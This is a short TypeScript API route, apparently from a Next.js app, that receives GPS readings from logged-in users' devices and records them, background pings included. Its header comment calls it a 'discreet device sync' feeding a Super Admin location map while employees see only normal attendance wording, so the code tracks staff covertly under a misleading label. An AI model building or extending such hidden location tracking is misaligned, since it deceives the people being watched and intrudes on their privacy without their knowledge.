import { requireUser } from '@/lib/auth'
import { jsonOk } from '@/lib/api-response'
import { recordLocationPing } from '@/lib/location-tracking'
import { handleRoute } from '@/lib/route-handler'

/** Discreet device sync — stores GPS for Super Admin map (employees see normal attendance wording only). */
function parseSyncBody(body: Record<string, unknown>) {
  const lat = body.latitude ?? body.la
  const lng = body.longitude ?? body.lo
  const accuracy = body.accuracy_m ?? body.ac
  const altitude = body.altitude_m ?? body.alt
  const speed = body.speed_mps ?? body.sp
  const heading = body.heading_deg ?? body.hd
  const sourceRaw = String(body.source ?? body.src ?? 'sync')
  let source: 'background' | 'foreground' | 'manual' = 'background'
  if (sourceRaw === 'foreground' || sourceRaw === 'fg' || sourceRaw === 'init') source = 'foreground'
  else if (sourceRaw === 'manual') source = 'manual'
  else if (sourceRaw === 'background' || sourceRaw === 'bg' || sourceRaw === 'sync') source = 'background'

  return {
    latitude: Number(lat),
    longitude: Number(lng),
    accuracy_m: accuracy != null ? Number(accuracy) : null,
    altitude_m: altitude != null ? Number(altitude) : null,
    speed_mps: speed != null ? Number(speed) : null,
    heading_deg: heading != null ? Number(heading) : null,
    source: source as 'background' | 'foreground' | 'manual',
  }
}

export async function POST(request: Request) {
  return handleRoute(async () => {
    const user = await requireUser(request)
    const body = (await request.json()) as Record<string, unknown>
    await recordLocationPing(user, parseSyncBody(body))
    return jsonOk({ ok: true })
  })
}
